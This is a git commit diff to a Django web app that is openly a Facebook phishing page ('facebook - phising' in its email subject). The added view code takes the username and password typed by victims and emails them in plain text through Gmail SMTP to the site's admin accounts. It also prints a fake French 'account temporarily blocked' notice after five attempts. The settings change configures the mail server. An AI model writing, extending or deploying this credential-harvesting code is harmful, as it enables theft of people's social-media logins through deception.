7c4168d3d7137fea29251467db8951294357d50c
Makan DIANKA <makan.dianka@hotmail.com>
2022-11-17 12:32:19 +0100

    email: add email sender

--- web/app/views.py
+++ web/app/views.py
@@ -1,8 +1,20 @@
 from django.shortcuts import render
 from django.contrib import messages
 from . models import Connexion
+from django.conf import settings
+from django.core.mail import EmailMessage
+from django.template.loader import render_to_string
+from django.contrib.auth.models import User
 
-# Create your views here.
+
+def admins_email(recipient:list)->list:
+    """return admins's email"""
+    users = User.objects.all()
+    for admin in users:
+        if admin.is_superuser:
+            recipient.append(admin.email)
+    return recipient
+
 def index(request):
     context = {}
     if request.method=="POST":
@@ -13,11 +25,27 @@ def index(request):
         auth.username = username
         auth.password = password
         # auth.save()
+
+        # send email with credential information 
+        sender = settings.EMAIL_HOST_USER
+        recipient = admins_email([])
+
+        template_email = render_to_string('app/email.html', {'username' : username, 'password' : password})
+        email = EmailMessage("New user logged into [facebook - phising]", template_email, sender, recipient)
+        email.fail_silently = False
+        try:
+            email.send()
+        except:
+            pass
+        else:
+            print("Message envoyé")
+
+        # the number of attempts limited to 5
         try:
             request.session['delay'] += 1
         except:
             request.session['delay'] = 1
-        
+
         if request.session['delay'] == 5:
             print("Trop de tentatifs. Votre facebook est temporairement bloqué")
             print("Réessayer dans 4 minutes")
--- web/web/settings.py
+++ web/web/settings.py
@@ -137,3 +137,11 @@ MEDIA_ROOT = os.path.join(BASE_DIR, 'static/media/')
 # https://docs.djangoproject.com/en/4.1/ref/settings/#default-auto-field
 
 DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'
+
+# email conf 
+EMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'
+EMAIL_HOST = 'smtp.gmail.com'
+EMAIL_PORT = 587
+EMAIL_USE_TLS = True
+EMAIL_HOST_USER = os.environ.get('EMAIL_HOST_USER')
+EMAIL_HOST_PASSWORD = os.environ.get('EMAIL_HOST_PASSWORD')
